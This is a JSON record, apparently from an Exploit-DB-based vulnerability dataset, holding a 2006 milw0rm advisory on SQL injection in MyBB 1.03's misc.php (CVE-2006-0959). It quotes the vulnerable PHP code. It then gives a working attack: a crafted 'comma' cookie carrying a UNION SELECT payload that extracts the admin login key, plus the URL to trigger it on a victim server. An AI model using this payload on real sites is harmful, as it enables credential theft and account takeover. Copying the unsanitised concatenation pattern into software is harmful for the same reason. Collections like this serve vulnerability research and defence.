{
  "id": "1539",
  "title": "MyBulletinBoard (MyBB) 1.03 - &#039;misc.php&#039; SQL Injection",
  "cve": "CVE-2006-0959",
  "vuln_type": "sqli",
  "code": "MyBB New SQL Injection\r\n\r\nD3vil-0x1 < Devil-00 >\r\n\r\nMilw0rm ID :-\r\nhttp://www.milw0rm.com/auth.php?id=1320\r\n\r\nThe Inf.File :-\r\nmisc.php\r\n\r\nLinez :-\r\n\r\n[code]\r\n\t$buddies = $mybb->user['buddylist'];\r\n\r\n\t$namesarray = explode(\",\",$buddies);\r\n\r\n\tif(is_array($namesarray))\r\n\r\n\t{\r\n\r\n\t\twhile(list($key, $buddyid) = each($namesarray))\r\n\r\n\t\t{\r\n\r\n\t\t\t$sql .= \"$comma'$buddyid'\"; <== HERE :) Uncleard Var !!\r\n\r\n\t\t\t$comma = \",\";\r\n\r\n\t\t}\r\n\r\n\t$timecut = time() - $mybb->settings['wolcutoff'];\r\n\r\n\t$query = $db->query(\"SELECT u.*, g.canusepms FROM \".TABLE_PREFIX.\"users u LEFT JOIN \".TABLE_PREFIX.\"usergroups g ON (g.gid=u.usergroup) WHERE u.uid IN ($sql)\");\r\n[/code]\r\n\r\nFrom 255 to 265\r\n\r\nThe GLOBALS unset function .. do not unset $_COOKIES ..\r\nthen u can start attacking any var by cookies :)\r\n\r\nTested MyBB 1.3 .. Register_Globals = On\r\n\r\nExplorer Exploit :-\r\n\r\n1- Login by any username ..\r\n2- Create new cookie (\r\n\tname \t=> \"comma\"\r\n\tvalue\t=> \"comma=0)%20%3C%3E%200%20UNION%20ALL%20SELECT%201,loginkey,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,1 FROM mybb_users WHERE uid=1/*\")\r\n\r\n3- Check The URL :-\r\nHOST/PATH/misc.php?action=buddypopup\r\n\r\nWhere HOST = The Vic.Server And PATH = MyBB Dir.\r\n\r\n# milw0rm.com [2006-02-28]",
  "url": "https://www.exploit-db.com/exploits/1539"
}